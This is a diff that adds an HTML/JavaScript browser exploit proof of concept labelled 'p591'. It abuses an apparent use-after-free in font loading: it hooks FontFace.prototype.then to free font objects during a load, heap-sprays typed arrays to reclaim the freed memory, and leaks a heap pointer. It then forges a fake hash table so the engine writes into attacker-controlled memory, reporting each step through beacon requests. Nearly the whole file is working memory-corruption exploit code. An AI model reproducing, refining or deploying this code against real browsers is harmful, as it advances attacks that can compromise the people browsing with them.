@@ -1,0 +1,189 @@
+<!--
+  p591: Forged +0x58 table write — addClient writes into attacker memory.
+
+  Code is p590-identical for UAF-1 (same mkSpray, same scanLane, same
+  countHits). Only the 100ms and 500ms timeouts differ: they set up a
+  fake HashTable inside lane1[hit] and forge +0x58 for UAF-2.
+
+  UAF-1: null +0x58 → leak T1, B1 = T1 - 0x60.
+  Fake table at B1+0x70..0xBF (80B, matches real engine alloc):
+    +0x70 deletedCount=0, +0x74 keyCount=0,
+    +0x78 tableSizeMask=7, +0x7C tableSize=8,
+    +0x80..+0xBF bucket[0..7]=0 (empty).
+  UAF-2: forged +0x58 = B1+0x80 (overwritten post-spray in getter).
+  Engine writes client ptr at B1+0x80+(hash&7)*8, keyCount 0→1 at B1+0x74.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p591</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<style id="v2">@font-face{font-family:sb;src:local(Helvetica);unicode-range:U+0044}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,hi,lo){wD(v,o,lo);wD(v,o+4,hi);}
+
+var stage=0,lane1=null,lane2=null,hit1idx=-1;
+var ft_hi=0,ft_lo=0;
+var FMODE=1;
+
+function mkSpray(tag,marker){
+  var lane=[];
+  for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+  for(var j=0;j<lane.length;j++){
+    var v=lane[j];
+    for(var k=0;k<192;k++)v[k]=0xAA;
+    wD(v,0x00,2);
+    wQ(v,0x58,0,0);
+    wD(v,0x60,0);
+    wD(v,0x64,0xFFFFFFFF);
+    wQ(v,0x68,0,0);
+    v[0x82]=3;
+    v[0x85]=0xAA;
+    v[0x04]=marker;
+  }
+  b(tag+lane.length);
+  return lane;
+}
+
+function scanLane(lane,tag){
+  if(!lane)return -1;
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i],rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    var w0=v[0x68]|v[0x69]|v[0x6A]|v[0x6B]|v[0x6C]|v[0x6D]|v[0x6E]|v[0x6F];
+    if(rc!==2||t0||w0){
+      b(tag+'H'+i+',rc='+rc);
+      var t58=rQ(v,0x58);
+      b(tag+'T='+t58);
+      if(t58!=='0000000000000000'){
+        var tlo=rD(v,0x58),thi=rD(v,0x5C);
+        var blo=tlo-0x60,bhi=thi;
+        if(blo<0){blo+=0x100000000;bhi-=1;}
+        b(tag+'B='+('00000000'+bhi.toString(16)).slice(-8)+('00000000'+blo.toString(16)).slice(-8));
+      }
+      b(tag+'W='+rQ(v,0x68));
+      b(tag+'ST='+v[0x82]+',MP='+v[0x85]+',TAG='+v[0x04]);
+      return i;
+    }
+  }
+  b(tag+'MISS');
+  return -1;
+}
+
+function countHits(lane){
+  if(!lane)return 0;
+  var n=0;
+  for(var i=0;i<lane.length;i++){
+    var rc=rD(lane[i],0);
+    var t0=lane[i][0x58]|lane[i][0x59]|lane[i][0x5A]|lane[i][0x5B]|lane[i][0x5C]|lane[i][0x5D]|lane[i][0x5E]|lane[i][0x5F];
+    if(rc!==2||t0)n++;
+  }
+  return n;
+}
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('F1');
+    lane1=mkSpray('S1-',0x11);
+    return;}
+  if(stage===2){stage=3;
+    document.getElementById('v2').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('F2');
+    lane2=mkSpray('S2-',0x22);
+    if(FMODE===1){for(var i=0;i<lane2.length;i++){wQ(lane2[i],0x58,ft_hi,ft_lo);wD(lane2[i],0x64,0);}}
+    if(FMODE===2){for(var i=0;i<lane2.length;i++){wQ(lane2[i],0x58,0,0);wD(lane2[i],0x64,0);}}
+    b('S2F'+FMODE);
+    return;}
+  return;
+},set:function(){}});
+
+function main(){
+b('G');
+
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+document.fonts.load('1em pa, sa','AB').then(function(){b('L1-OK');},function(){b('L1-FAIL');});
+
+setTimeout(function(){
+  hit1idx=scanLane(lane1,'A');
+  if(hit1idx<0){b('UAF1-NOHIT');return;}
+  var n1=countHits(lane1);
+  b('L1HITS='+n1);
+
+  var v1=lane1[hit1idx];
+  var t1_lo=rD(v1,0x58),t1_hi=rD(v1,0x5C);
+  var b1_lo=t1_lo-0x60,b1_hi=t1_hi;
+  if(b1_lo<0){b1_lo+=0x100000000;b1_hi-=1;}
+  b('B1='+('00000000'+b1_hi.toString(16)).slice(-8)+('00000000'+b1_lo.toString(16)).slice(-8));
+
+  ft_lo=b1_lo+0x80;ft_hi=b1_hi;
+  if(ft_lo>=0x100000000){ft_lo-=0x100000000;ft_hi+=1;}
+  b('FT='+('00000000'+ft_hi.toString(16)).slice(-8)+('00000000'+ft_lo.toString(16)).slice(-8));
+
+  wD(v1,0x70,0);wD(v1,0x74,0);wD(v1,0x78,7);wD(v1,0x7C,8);
+  wQ(v1,0x80,0,0);wQ(v1,0x88,0,0);wQ(v1,0x90,0,0);wQ(v1,0x98,0,0);
+  wQ(v1,0xA0,0,0);wQ(v1,0xA8,0,0);wQ(v1,0xB0,0,0);wQ(v1,0xB8,0,0);
+  b('FTSET');
+
+  stage=2;
+  var pb=new FontFace('pb','local(Arial)',{unicodeRange:'U+0043'});
+  document.fonts.add(pb);void pb.loaded;
+  document.fonts.load('1em pb, sb','CD').then(function(){b('L2-OK');},function(){b('L2-FAIL');});
+},100);
+
+setTimeout(function(){
+  if(stage<2){b('UAF2-NOTRIG,stage='+stage);return;}
+  if(!lane2){b('UAF2-NOSPRAY,stage='+stage);return;}
+
+  var hit2=-1;
+  for(var i=0;i<lane2.length;i++){
+    var v=lane2[i],rc=rD(v,0);
+    if(rc!==2){hit2=i;break;}
+  }
+  if(hit2<0){
+    for(var i=0;i<lane2.length;i++){
+      var v=lane2[i];
+      var w0=v[0x68]|v[0x69]|v[0x6A]|v[0x6B]|v[0x6C]|v[0x6D]|v[0x6E]|v[0x6F];
+      if(w0){hit2=i;b('WFALLBACK');break;}
+    }
+  }
+  if(hit2>=0){
+    var h=lane2[hit2];
+    b('BH'+hit2+',rc='+rD(h,0));
+    b('BT='+rQ(h,0x58));
+    b('B60='+rQ(h,0x60));
+    b('BW='+rQ(h,0x68));
+    b('BST='+h[0x82]+',MP='+h[0x85]+',TAG='+h[0x04]);
+  } else {
+    b('UAF2-MISS');
+  }
+
+  if(FMODE&&hit1idx>=0){
+    var v1=lane1[hit1idx];
+    b('KC='+rD(v1,0x74));
+    b('FTD='+rQ(v1,0x70)+'.'+rQ(v1,0x78));
+    b('BK0='+rQ(v1,0x80)+'.'+rQ(v1,0x88)+'.'+rQ(v1,0x90)+'.'+rQ(v1,0x98));
+    b('BK4='+rQ(v1,0xA0)+'.'+rQ(v1,0xA8)+'.'+rQ(v1,0xB0)+'.'+rQ(v1,0xB8));
+    var kc=rD(v1,0x74);
+    var anyBkt=0;
+    for(var bi=0x80;bi<0xC0;bi+=8){if(rQ(v1,bi)!=='0000000000000000'){anyBkt=1;break;}}
+    if(kc>=1&&anyBkt)b('FORGE_WRITE=YES,kc='+kc);
+    else if(kc>=1)b('FORGE_WRITE=KC_ONLY,kc='+kc);
+    else b('FORGE_WRITE=NO,kc='+kc);
+  }
+},500);
+
+setTimeout(function(){b('ALIVE');},2000);
+setTimeout(function(){b('ALIVE2');},5000);
+}
+setTimeout(main,0);
+</script></head><body>p591</body></html>
